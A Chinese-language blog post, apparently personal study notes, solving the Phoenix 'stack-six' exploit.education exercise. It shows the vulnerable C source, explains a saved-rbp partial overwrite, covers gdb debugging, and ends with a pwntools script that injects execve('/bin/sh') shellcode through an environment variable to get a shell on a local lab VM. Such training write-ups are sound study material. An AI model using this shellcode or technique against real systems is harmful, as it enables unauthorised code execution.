---
title: "[pwn笔记3]stack-six(phoenix)"
urlname: "[pwn笔记3]"
tags: [stack, pwn]
date: April 30, 2023 10:11 PM
---

## 听说把这段写进~/.gdbinit里面会让栈的情况更加真实（在调试的时候）

（参考[https://n1ght-w0lf.github.io/binary exploitation/stack-six/](https://n1ght-w0lf.github.io/binary%20exploitation/stack-six/)）

```bash
unset env LINES
unset env COLUMNS
set env _ /opt/phoenix/amd64/stack-six
```

## 然后这是本题源码

```c
/*
 * phoenix/stack-six, by https://exploit.education
 *
 * Can you execve("/bin/sh", ...) ?
 *
 * Why do fungi have to pay double bus fares? Because they take up too
 * mushroom.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *what = GREET;

char *greet(char *who) {
  char buffer[128];
  int maxSize;

  maxSize = strlen(who);
  if (maxSize > (sizeof(buffer) - /* ensure null termination */ 1)) {
    maxSize = sizeof(buffer) - 1;
  }

  strcpy(buffer, what);
  strncpy(buffer + strlen(buffer), who, maxSize);

  return strdup(buffer);
}

int main(int argc, char **argv) {
  char *ptr;
  printf("%s\n", BANNER);

#ifdef NEWARCH
  if (argv[1]) {
    what = argv[1];
  }
#endif

  ptr = getenv("ExploitEducation");
  if (NULL == ptr) {
    // This style of comparison prevents issues where you may accidentally
    // type if(ptr = NULL) {}..

    errx(1, "Please specify an environment variable called ExploitEducation");
  }

  printf("%s\n", greet(ptr));
  return 0;
}
```

## 理论

其中greet函数有两点错误：

- strncpy函数不会自动在末尾添加\0，而strdup是根据\0来判断结尾的

- strncpy的起始地址是buffer + GREET的长度，但复制长度确是maxSize，导致了末尾有个跟GREET一样长的区域可以溢出（好像减了1）。

调试一下发现，覆盖不到返回地址，但是可以覆盖到压进栈里的rbp的最后两位。

众所周知（不知道的看这个<https://zhuanlan.zhihu.com/p/27339191>），进入函数时会执行：

```nasm
call xxx
;相当于
;push $+1
;jmp xxx
push rbp
mov rbp, rsp
sub rsp, xxx
```

而函数返回时执行的

```nasm
leave
ret
```

相当于

```nasm
mov rsp, rbp
pop rbp
pop rip
```

当我们把greet函数栈里面存着的（前）rbp改为了x。

那么`*x`就会变成main函数的栈底，`*x+8`就会变成main函数的返回地址。

## 理论存在，实践开始

gdb调试一下，能改的范围在：0x7fffffffe500~0x7fffffffe5ff

用这个命令看看这个范围里都有什么东西

```
x/32xg 0x00007fffffffe500
```

顺便确定一下我们输入的东西在哪。（注意不在栈的范围的东西不能要了（存疑），所以我们搜环境变量）

```
(gdb) grep ExploitEducation=
[+] Searching 'ExploitEducation=' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rwx
  0x7fffffffeee5 - 0x7fffffffef1c  →   "ExploitEducation=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
```

去掉开头，确定我们输入的范围

```
>>> hex(0xeee5+len("ExploitEducation="))
'0xeef6'
>>> hex(0xeee5+126)
'0xef63'
```

回到之前看的范围（好像这样写顺序不太对，不管了）

`0x7fffffffe5c8`里正好是`0x00007fffffffeef6`，你说巧不巧

```python
from pwn import *

shell = ssh("user", "localhost", password="user", port=2222)
shellcode = b'\x90'*20
shellcode += b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode += b"A"*(126-len(shellcode))+b'\xc0'

sh = shell.run("/opt/phoenix/amd64/stack-six", env={"ExploitEducation": shellcode})
print(sh.recvline())
sh.interactive()
```

好了。

![结果](../images/[pwn笔记3]%2073a412be24d94419b5e23f937cfdf3af/2023-05-01-22-22-48-image.png)
